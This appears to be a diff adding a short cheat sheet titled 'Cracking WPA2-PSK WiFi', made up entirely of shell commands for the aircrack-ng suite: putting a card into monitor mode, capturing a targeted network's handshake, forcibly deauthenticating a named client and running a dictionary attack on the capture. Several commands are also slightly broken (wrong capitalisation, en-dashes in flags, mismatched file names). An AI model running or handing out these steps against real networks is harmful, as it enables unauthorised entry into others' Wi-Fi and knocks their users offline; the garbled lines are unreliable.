@@ -1,0 +1,11 @@
+========================:CRACKING WPA2-PSK WIFI:================================
+
+
+root@HackCieux:~# airmon-ng check kill
+root@HackCieux:~# airmon-ng
+root@HackCieux:~# airmon-ng start wlan1
+root@HackCieux:~# Airodump-ng wlan1mon
+root@HackCieux:~# airodump-ng –c 8 --bssid 40:88:05:B5:75:C4 –w HackCieux_3way_Handshake wlan1mon
+[----open new terminal-----]
+root@HackCieux:~# aireplay-ng -0 1 -a 40:88:05:B5:75:C4 -c A4:5E:60:D4:83:55 wlan1mon
+root@HackCieux:~# aircrack-ng -0 -w word.txt HackCieux_3way_handshake.cap
